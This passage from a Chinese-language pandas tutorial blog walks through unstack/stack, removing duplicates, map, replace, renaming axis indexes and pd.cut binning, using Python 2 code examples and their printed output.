5</span><br></pre></td></tr></table></figure>
</li>
<li><p>默认操作是最内层，传入分层级别的编号或名称</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> result</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> result.unstack(<span class="number">1</span>) <span class="comment"># 1 代表着第二层，从0开始</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> result.unstack(<span class="string">'state'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">state     number</span><br><span class="line">Ohio      one       0</span><br><span class="line">          two       1</span><br><span class="line">          three     2</span><br><span class="line">Colorado  one       3</span><br><span class="line">          two       4</span><br><span class="line">          three     5</span><br><span class="line">dtype: int32</span><br><span class="line"></span><br><span class="line">number    one  two  three</span><br><span class="line">state</span><br><span class="line">Ohio        0    1      2</span><br><span class="line">Colorado    3    4      5</span><br><span class="line">state   Ohio  Colorado</span><br><span class="line">number</span><br><span class="line">one        0         3</span><br><span class="line">two        1         4</span><br><span class="line">three      2         5</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果不是左右级别值都能在分组中找到，则unstack操作会引入缺失数据</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">s1 = pd.Series([<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],index = list(<span class="string">'abcd'</span>))</span><br><span class="line">s2 = pd.Series([<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>], index = list(<span class="string">'cde'</span>))</span><br><span class="line">data2 = pd.concat([s1, s2], keys = [<span class="string">'one'</span>, <span class="string">'two'</span>])</span><br><span class="line"><span class="keyword">print</span> data2</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data2.unstack()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">one  a    0</span><br><span class="line">     b    1</span><br><span class="line">     c    2</span><br><span class="line">     d    3</span><br><span class="line">two  c    4</span><br><span class="line">     d    5</span><br><span class="line">     e    6</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">       a    b    c    d    e</span><br><span class="line">one  0.0  1.0  2.0  3.0  NaN</span><br><span class="line">two  NaN  NaN  4.0  5.0  6.0</span><br></pre></td></tr></table></figure>
</li>
<li><p>stack反而会滤除缺失数据，所以该运算是可逆的</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> data2.unstack()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data2.unstack().stack()</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不滤除</span></span><br><span class="line"><span class="keyword">print</span> data2.unstack().stack(dropna = <span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">       a    b    c    d    e</span><br><span class="line">one  0.0  1.0  2.0  3.0  NaN</span><br><span class="line">two  NaN  NaN  4.0  5.0  6.0</span><br><span class="line"></span><br><span class="line">one  a    0.0</span><br><span class="line">     b    1.0</span><br><span class="line">     c    2.0</span><br><span class="line">     d    3.0</span><br><span class="line">two  c    4.0</span><br><span class="line">     d    5.0</span><br><span class="line">     e    6.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">one  a    0.0</span><br><span class="line">     b    1.0</span><br><span class="line">     c    2.0</span><br><span class="line">     d    3.0</span><br><span class="line">     e    NaN</span><br><span class="line">two  a    NaN</span><br><span class="line">     b    NaN</span><br><span class="line">     c    4.0</span><br><span class="line">     d    5.0</span><br><span class="line">     e    6.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
<li><p>对DF进行unstack操作，旋转轴的级别或变成结果中的最低级别</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">df = pd.DataFrame(&#123;<span class="string">'left'</span>: result,<span class="string">'right'</span>: result + <span class="number">5</span>&#125;,</span><br><span class="line">                  columns = pd.Index([<span class="string">'left'</span>, <span class="string">'right'</span>], name = <span class="string">'side'</span>))</span><br><span class="line"><span class="keyword">print</span> df</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.unstack(<span class="string">'state'</span>)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> df.unstack(<span class="string">'state'</span>).stack(<span class="string">'side'</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">side             left  right</span><br><span class="line">state    number</span><br><span class="line">Ohio     one        0      5</span><br><span class="line">         two        1      6</span><br><span class="line">         three      2      7</span><br><span class="line">Colorado one        3      8</span><br><span class="line">         two        4      9</span><br><span class="line">         three      5     10</span><br><span class="line"></span><br><span class="line">side   left          right</span><br><span class="line">state  Ohio Colorado  Ohio Colorado</span><br><span class="line">number</span><br><span class="line">one       0        3     5        8</span><br><span class="line">two       1        4     6        9</span><br><span class="line">three     2        5     7       10</span><br><span class="line"></span><br><span class="line">state         Ohio  Colorado</span><br><span class="line">number side</span><br><span class="line">one    left      0         3</span><br><span class="line">       right     5         8</span><br><span class="line">two    left      1         4</span><br><span class="line">       right     6         9</span><br><span class="line">three  left      2         5</span><br><span class="line">       right     7        10</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="将”长格式”旋转成”宽格式”"><a href="#将”长格式”旋转成”宽格式”" class="headerlink" title="将”长格式”旋转成”宽格式”"></a>将”长格式”旋转成”宽格式”</h3><ol>
<li><p>时间序列数据为”长格式(long)”或”堆叠格式(stacked)”储存</p>
<ol>
<li><p>使用DF.pivoted方法来处理,可以实现转换</p>
</li>
<li><p>待补充</p>
</li>
</ol>
</li>
</ol>
<h2 id="数据转换"><a href="#数据转换" class="headerlink" title="数据转换"></a>数据转换</h2><h3 id="移除重复数据"><a href="#移除重复数据" class="headerlink" title="移除重复数据"></a>移除重复数据</h3><ol>
<li><p>DF的duplicated方法返回一个布尔Series，表示各行是否是重复行</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(&#123;<span class="string">'k1'</span>: [<span class="string">'one'</span>] * <span class="number">3</span> + [<span class="string">'two'</span>] * <span class="number">4</span>,</span><br><span class="line">                     <span class="string">'k2'</span>: [<span class="number">1</span>,<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">4</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#duplicated方法</span></span><br><span class="line"><span class="keyword">print</span> data.duplicated()</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">    k1  k2</span><br><span class="line">0  one   1</span><br><span class="line">1  one   1</span><br><span class="line">2  one   2</span><br><span class="line">3  two   3</span><br><span class="line">4  two   3</span><br><span class="line">5  two   4</span><br><span class="line">6  two   4</span><br><span class="line"></span><br><span class="line">0    False</span><br><span class="line">1     True</span><br><span class="line">2    False</span><br><span class="line">3    False</span><br><span class="line">4     True</span><br><span class="line">5    False</span><br><span class="line">6     True</span><br><span class="line">dtype: bool</span><br></pre></td></tr></table></figure>
</li>
<li><p>DF的drop~duplicates方法~，返回一个移除了重复行的DF</p>
</li>
<li><p>duplicated和drop~duplicated默认会判断全部列~</p>
<ol>
<li><p>也可以指定部分列进行重复项判断,默认保留第一次出现的值组合</p>
</li>
<li><p>也可以传入take~last~ = True来保留最后一个</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">data[<span class="string">'v1'</span>] = range(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#指定根据k1来判断</span></span><br><span class="line"><span class="keyword">print</span> data.drop_duplicates([<span class="string">'k1'</span>])</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#根据k1和k2判断，但是保留最后一项</span></span><br><span class="line"><span class="keyword">print</span> data.drop_duplicates([<span class="string">'k1'</span>, <span class="string">'k2'</span>], take_last = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">    k1  k2  v1</span><br><span class="line">0  one   1   0</span><br><span class="line">1  one   1   1</span><br><span class="line">2  one   2   2</span><br><span class="line">3  two   3   3</span><br><span class="line">4  two   3   4</span><br><span class="line">5  two   4   5</span><br><span class="line">6  two   4   6</span><br><span class="line"></span><br><span class="line">    k1  k2  v1</span><br><span class="line">0  one   1   0</span><br><span class="line">3  two   3   3</span><br><span class="line"></span><br><span class="line">    k1  k2  v1</span><br><span class="line">1  one   1   1</span><br><span class="line">2  one   2   2</span><br><span class="line">4  two   3   4</span><br><span class="line">6  two   4   6</span><br></pre></td></tr></table></figure>
</li>
</ol>
</li>
</ol>
<h3 id="利用函数或映射进行数据转换"><a href="#利用函数或映射进行数据转换" class="headerlink" title="利用函数或映射进行数据转换"></a>利用函数或映射进行数据转换</h3><ol>
<li><p>使用map函数</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(&#123;<span class="string">'food'</span>: [<span class="string">'bacon'</span>, <span class="string">'pulled pork'</span>, <span class="string">'bacon'</span>, <span class="string">'Pastrami'</span>,</span><br><span class="line">                              <span class="string">'corned beef'</span>, <span class="string">'Bacon'</span>, <span class="string">'pastrami'</span>, <span class="string">'honey ham'</span>,</span><br><span class="line">                              <span class="string">'nova lox'</span>],</span><br><span class="line">                     <span class="string">'ounces'</span>: [<span class="number">4</span>,<span class="number">3</span>,<span class="number">12</span>,<span class="number">6</span>,<span class="number">7.5</span>,<span class="number">8</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">6</span>]&#125;)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#需要添加的列表，表示该肉类食物来源的动物类型</span></span><br><span class="line">meat_to_animal = &#123;<span class="string">'bacon'</span>: <span class="string">'pig'</span>,</span><br><span class="line">                  <span class="string">'pulled pork'</span>: <span class="string">'pig'</span>,</span><br><span class="line">                  <span class="string">'pastrami'</span>: <span class="string">'cow'</span>,</span><br><span class="line">                  <span class="string">'corned beef'</span>: <span class="string">'cow'</span>,</span><br><span class="line">                  <span class="string">'honey ham'</span>: <span class="string">'pig'</span>,</span><br><span class="line">                  <span class="string">'nova lox'</span>: <span class="string">'salmon'</span>&#125;</span><br><span class="line"><span class="comment">#Series的map方法接受一个函数或者含有映射关系的字典型对象</span></span><br><span class="line">data[<span class="string">'animal'</span>] = data[<span class="string">'food'</span>].map(str.lower).map(meat_to_animal)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#直接传入一个直接完成全部工作的函数</span></span><br><span class="line"><span class="keyword">print</span> data[<span class="string">'food'</span>].map(<span class="keyword">lambda</span> x: meat_to_animal[x.lower()])</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">          food  ounces</span><br><span class="line">0        bacon     4.0</span><br><span class="line">1  pulled pork     3.0</span><br><span class="line">2        bacon    12.0</span><br><span class="line">3     Pastrami     6.0</span><br><span class="line">4  corned beef     7.5</span><br><span class="line">5        Bacon     8.0</span><br><span class="line">6     pastrami     3.0</span><br><span class="line">7    honey ham     5.0</span><br><span class="line">8     nova lox     6.0</span><br><span class="line"></span><br><span class="line">          food  ounces  animal</span><br><span class="line">0        bacon     4.0     pig</span><br><span class="line">1  pulled pork     3.0     pig</span><br><span class="line">2        bacon    12.0     pig</span><br><span class="line">3     Pastrami     6.0     cow</span><br><span class="line">4  corned beef     7.5     cow</span><br><span class="line">5        Bacon     8.0     pig</span><br><span class="line">6     pastrami     3.0     cow</span><br><span class="line">7    honey ham     5.0     pig</span><br><span class="line">8     nova lox     6.0  salmon</span><br><span class="line"></span><br><span class="line">0       pig</span><br><span class="line">1       pig</span><br><span class="line">2       pig</span><br><span class="line">3       cow</span><br><span class="line">4       cow</span><br><span class="line">5       pig</span><br><span class="line">6       cow</span><br><span class="line">7       pig</span><br><span class="line">8    salmon</span><br><span class="line">Name: food, dtype: object</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="替换值"><a href="#替换值" class="headerlink" title="替换值"></a>替换值</h3><ol>
<li><p>repalce方法来替换</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">data = pd.Series([<span class="number">1</span>, <span class="number">-999</span>, <span class="number">2</span>, <span class="number">-999</span>, <span class="number">-1000</span>, <span class="number">3</span>])</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.replace(<span class="number">-999</span>, np.nan)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.replace([<span class="number">-999</span>,<span class="number">-1000</span>], np.nan) <span class="comment">#-999和-1000替换成NA</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.replace([<span class="number">-999</span>, <span class="number">-1000</span>], [np.nan, <span class="number">0</span>]) <span class="comment">#分别替换</span></span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="keyword">print</span> data.replace(&#123;<span class="number">-999</span>: np.nan, <span class="number">-1000</span>: <span class="number">0</span>&#125;)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0       1</span><br><span class="line">1    -999</span><br><span class="line">2       2</span><br><span class="line">3    -999</span><br><span class="line">4   -1000</span><br><span class="line">5       3</span><br><span class="line">dtype: int64</span><br><span class="line"></span><br><span class="line">0       1.0</span><br><span class="line">1       NaN</span><br><span class="line">2       2.0</span><br><span class="line">3       NaN</span><br><span class="line">4   -1000.0</span><br><span class="line">5       3.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">0    1.0</span><br><span class="line">1    NaN</span><br><span class="line">2    2.0</span><br><span class="line">3    NaN</span><br><span class="line">4    NaN</span><br><span class="line">5    3.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">0    1.0</span><br><span class="line">1    NaN</span><br><span class="line">2    2.0</span><br><span class="line">3    NaN</span><br><span class="line">4    0.0</span><br><span class="line">5    3.0</span><br><span class="line">dtype: float64</span><br><span class="line"></span><br><span class="line">0    1.0</span><br><span class="line">1    NaN</span><br><span class="line">2    2.0</span><br><span class="line">3    NaN</span><br><span class="line">4    0.0</span><br><span class="line">5    3.0</span><br><span class="line">dtype: float64</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h2 id="重命名轴索引"><a href="#重命名轴索引" class="headerlink" title="重命名轴索引"></a>重命名轴索引</h2><h3 id="对轴索引的操作-map-和rename"><a href="#对轴索引的操作-map-和rename" class="headerlink" title="对轴索引的操作 map 和rename"></a>对轴索引的操作 map 和rename</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">data = pd.DataFrame(np.arange(<span class="number">12</span>).reshape(<span class="number">3</span>,<span class="number">4</span>),</span><br><span class="line">                    index = [<span class="string">'Ohio'</span>, <span class="string">'Colorado'</span>, <span class="string">'New York'</span>],</span><br><span class="line">                    columns = [<span class="string">'one'</span>,<span class="string">'two'</span>, <span class="string">'three'</span>, <span class="string">'four'</span>])</span><br><span class="line"><span class="comment">#把index都变成大写</span></span><br><span class="line"><span class="keyword">print</span> data.index.map(str.upper)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#用赋值来修改原本数据</span></span><br><span class="line">data.index = data.index.map(str.upper)</span><br><span class="line"><span class="keyword">print</span> data</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#str.title返回标题化的数据，就是开头大写的数据</span></span><br><span class="line"><span class="keyword">print</span> data.rename(index = str.title, columns = str.upper)</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment"># rename可以使用字典对象来对部分轴标签更新</span></span><br><span class="line"><span class="keyword">print</span> data.rename(index = &#123;<span class="string">'OHIO'</span>: <span class="string">'INDIANA'</span>&#125;,</span><br><span class="line">                  columns = &#123;<span class="string">"three"</span>: <span class="string">'peekaboo'</span>&#125;)</span><br><span class="line"><span class="keyword">print</span></span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[&apos;OHIO&apos; &apos;COLORADO&apos; &apos;NEW YORK&apos;]</span><br><span class="line"></span><br><span class="line">          one  two  three  four</span><br><span class="line">OHIO        0    1      2     3</span><br><span class="line">COLORADO    4    5      6     7</span><br><span class="line">NEW YORK    8    9     10    11</span><br><span class="line"></span><br><span class="line">          ONE  TWO  THREE  FOUR</span><br><span class="line">Ohio        0    1      2     3</span><br><span class="line">Colorado    4    5      6     7</span><br><span class="line">New York    8    9     10    11</span><br><span class="line"></span><br><span class="line">          one  two  peekaboo  four</span><br><span class="line">INDIANA     0    1         2     3</span><br><span class="line">COLORADO    4    5         6     7</span><br><span class="line">NEW YORK    8    9        10    11</span><br></pre></td></tr></table></figure>
<h3 id="如果希望就地修改数据，传入-inplace-True-即可"><a href="#如果希望就地修改数据，传入-inplace-True-即可" class="headerlink" title="如果希望就地修改数据，传入 inplace = True 即可"></a>如果希望就地修改数据，传入 inplace = True 即可</h3><h2 id="离散化和面元划分"><a href="#离散化和面元划分" class="headerlink" title="离散化和面元划分"></a>离散化和面元划分</h2><h3 id="连续数据常常被离散化或者拆分成”面元-bin-”-pd-cut"><a href="#连续数据常常被离散化或者拆分成”面元-bin-”-pd-cut" class="headerlink" title="连续数据常常被离散化或者拆分成”面元(bin)” pd.cut"></a>连续数据常常被离散化或者拆分成”面元(bin)” pd.cut</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 假设希望划分下列年龄</span></span><br><span class="line"><span class="comment"># 分为 '18到25' '26到35' '35到60' '60以上'几个面元，使用pd.cut函数</span></span><br><span class="line"></span><br><span class="line">ages = [<span class="number">20</span>, <span class="number">22</span>, <span class="number">25</span>, <span class="number">27</span>, <span class="number">21</span>, <span class="number">23</span>, <span class="number">37</span>, <span class="number">31</span>, <span class="number">61</span>, <span class="number">45</span>, <span class="number">41</span>, <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#划分， 结果返回所在的区间</span></span><br><span class="line">bins = [<span class="number">18</span>, <span class="number">25</span>, <span class="number">35</span>, <span class="number">60</span>, <span class="number">100</span>]</span><br><span class="line">cuts = pd.cut(ages, bins)</span><br><span class="line"><span class="keyword">print</span> cuts</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[(18, 25], (18, 25], (18, 25], (25, 35], (18, 25], ..., (25, 35], (60, 100], (35, 60], (35, 60], (25, 35]]</span><br><span class="line">Length: 12</span><br><span class="line">Categories (4, object): [(18, 25] &lt; (25, 35] &lt; (35, 60] &lt; (60, 100]]</span><br></pre></td></tr></table></figure>
<ol>
<li><p>cut函数返回一个特殊的Categorical对象，</p>
<ol>
<li><p>其拥有不同分类名字的levels数组</p>
</li>
<li><p>以及一个为数据进行标号的labels属性</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># labels是区间的序号</span></span><br><span class="line"><span class="keyword">print</span> cuts.labels</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#levels是所有的区间</span></span><br><span class="line"><span class="keyword">print</span> cuts.levels</span><br><span class="line"><span class="keyword">print</span></span><br><span class="line"><span class="comment">#数在个区间的个数</span></span><br><span class="line"><span class="keyword">print</span> pd.value_counts(cuts)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[0 0 0 1 0 0 2 1 3 2 2 1]</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Index([u&apos;(18, 25]&apos;, u&apos;(25, 35]&apos;, u&apos;(35, 60]&apos;, u&apos;(60, 100]&apos;], dtype=&apos;object&apos;)</span><br></pre></td></tr></table></figure>
<p>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">(18, 25]     5</span><br><span class="line">(35, 60]     3</span><br><span class="line">(25, 35]     3</span><br><span class="line">(60, 100]    1</span><br><span class="line">dtype: int64</span><br></pre></td></tr></table></figure>
<ol>
<li><p>括号表示开区间，方括号表示闭区间</p>
</li>
<li><p>那边是闭区间可以通过 right = False 来修改</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> pd.cut(ages, [<span class="number">18</span>, <span class="number">26</span>, <span class="number">36</span>, <span class="number">61</span>, <span class="number">100</span>],right = <span class="literal">False</span>)</span><br><span class="line"><span class="keyword">print</span> pd.cut(ages, [<span class="number">18</span>,<span class="number">26</span>,<span class="number">36</span>,<span class="number">61</span>, <span class="number">100</span>], right = <span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[[18, 26), [18, 26), [18, 26), [26, 36), [18, 26), ..., [26, 36), [61, 100), [36, 61), [36, 61), [26, 36)]</span><br><span class="line">Length: 12</span><br><span class="line">Categories (4, object): [[18, 26) &lt; [26, 36) &lt; [36, 61) &lt; [61, 100)]</span><br><span class="line">[(18, 26], (18, 26], (18, 26], (26, 36], (18, 26], ..., (26, 36], (36, 61], (36, 61], (36, 61], (26, 36]]</span><br><span class="line">Length: 12</span><br><span class="line">Categories (4, object): [(18, 26] &lt; (26, 36] &lt; (36, 61] &lt; (61, 100]]</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加标签，代替显示区间，使用cut的labels参数</p>
